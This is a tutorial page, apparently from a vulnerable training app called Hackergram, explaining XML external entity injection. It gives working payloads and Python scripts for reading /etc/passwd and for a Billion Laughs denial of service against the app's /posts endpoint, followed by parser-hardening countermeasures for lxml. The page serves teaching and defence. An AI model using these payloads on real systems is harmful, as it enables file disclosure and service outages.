# XXE Injection

XXE injection occurs when an application processes attacker-controlled XML using a parser that permits external entity resolution. XML allows documents to declare custom entities through a `<!DOCTYPE>` definition, and these entities may reference local files, remote resources, or recursively defined structures. When a parser expands such entities, it treats attacker-supplied directives as part of the document's structure, enabling outcomes that range from information disclosure to denial of service.

A typical malicious payload embeds a `<!DOCTYPE>` declaration that defines an external entity:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

If the parser resolves the entity `&xxe;`, the referenced file is incorporated into the parsed document and may then be exposed through the application's response. More complex payloads exploit the parser's ability to expand nested entities, causing exponential growth during parsing and overwhelming system resources. These behaviors illustrate that XXE attacks do not rely on application-level logic but on the XML parser's willingness to interpret attacker-controlled structure.

## Hackergram Implementation

In Hackergram, XML support was added to the `/posts` endpoint to accommodate both traditional form submissions and structured API-style requests. While the framework automatically handles form data, XML submissions required explicit parsing, and the selected parser was left in a permissive configuration that allowed external entity resolution. This makes the endpoint a direct example of how parser-driven vulnerabilities arise when attacker-controlled structure is forwarded to a backend parser.

### File Retrieval Attack

This attack targets the parser's handling of external entities. The attacker submits a crafted XML document to the `/posts` endpoint containing a `<!DOCTYPE>` declaration that defines an external entity referencing the system file `/etc/passwd`. Within the XML body, this entity is expanded, causing the parser to read the referenced file and incorporate its contents into the parsed output. The script then extracts the leaked data from the server's response and prints it to the console.

Run the following script at the attacker's machine:

??? note "File Retrieval Attack Script"

    ```py
    import requests
    import sys
    from lxml import etree

    def reset(session):
        session.get(SERVER + "/reset")

    def register(session):
        payload = {
            'username': "mallory",
            'name': "Mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/signup", data=payload)

    def login(session):
        payload = {
            'username': "mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/login", data=payload)

    def exploit(session):
        xml_payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <post>
    <content>&xxe;</content>
    </post>"""

        headers = {'Content-Type': 'application/xml'}
        r = session.post(SERVER + "/posts", data=xml_payload, headers=headers)
        print("Server response:")
        print(r.text)

    if __name__ == '__main__':
        host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
        port = '80' if len(sys.argv) < 3 else sys.argv[2]
        SERVER = "http://" + host + ":" + port
        print(SERVER)
        print("--------------------------------------\n")
        with requests.session() as s:
            reset(s)
            register(s)
            login(s)
            exploit(s)
    ```

Executing the exploit causes the parser to retrieve and expand the referenced file, resulting in disclosure of its contents in the server's response.

### Billion Laughs Denial of Service

This attack exploits the parser's handling of recursively defined XML entities. The attacker submits an XML payload containing a chain of nested entities, each expanding into a progressively larger value:

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>
  <query>&lol9;</query>
</root>
```

Run the following script at the attacker's machine:

??? note "Billion Laughs Denial of Service Script"

    ```py
    import requests
    import sys

    def reset(session):
        session.get(SERVER + "/reset")

    def register(session):
        payload = {
            'username': "mallory",
            'name': "Mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/signup", data=payload)

    def login(session):
        payload = {
            'username': "mallory",
            'password': "eve123"
        }
        session.post(SERVER + "/login", data=payload)

    def exploit(session):
        xml_payload = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <root>
    <query>&lol9;</query>
    </root>"""

        headers = {'Content-Type': 'application/xml'}
        print("Sending Billion Laughs payload...")
        try:
            r = session.post(SERVER + "/posts", data=xml_payload, headers=headers, timeout=10)
            print(f"Response status: {r.status_code}")
        except requests.exceptions.Timeout:
            print("Request timed out — server may be overwhelmed.")
        except requests.exceptions.ConnectionError:
            print("Connection failed — server may be down.")

    if __name__ == '__main__':
        host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
        port = '80' if len(sys.argv) < 3 else sys.argv[2]
        SERVER = "http://" + host + ":" + port
        print(SERVER)
        print("--------------------------------------\n")
        with requests.session() as s:
            reset(s)
            register(s)
            login(s)
            exploit(s)
    ```

When this payload is submitted to the `/posts` endpoint, the XML parser attempts to resolve `&lol9;`, which depends on all preceding entities. This causes exponential expansion during parsing, rapidly consuming memory and CPU resources. As the expansion grows, the application becomes unresponsive and the server eventually terminates the process due to resource exhaustion. Subsequent requests fail because the service is unavailable, illustrating how parser-level entity expansion can be turned into a denial-of-service condition.

## Countermeasures

XXE vulnerabilities are eliminated by configuring the XML parser to disallow external entity resolution and `DOCTYPE` declarations entirely. In Python's `lxml` library this is done by passing a restricted `XMLParser`:

```py
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
tree = etree.fromstring(xml_data, parser)
```

With `resolve_entities=False` the parser treats entity references as plain text instead of expanding them, neutralising both file retrieval and Billion Laughs payloads. `no_network=True` prevents the parser from issuing outbound requests for remote entities, and `load_dtd=False` blocks `DOCTYPE` declarations from being processed at all.

!!! note "Broader context"

    SQL injection, NoSQL injection, and XXE are all parser-driven attacks: they arise when attacker-controlled input is incorporated into a structured construct before parsing, allowing the attacker to alter query logic, introduce operators, or trigger entity resolution. 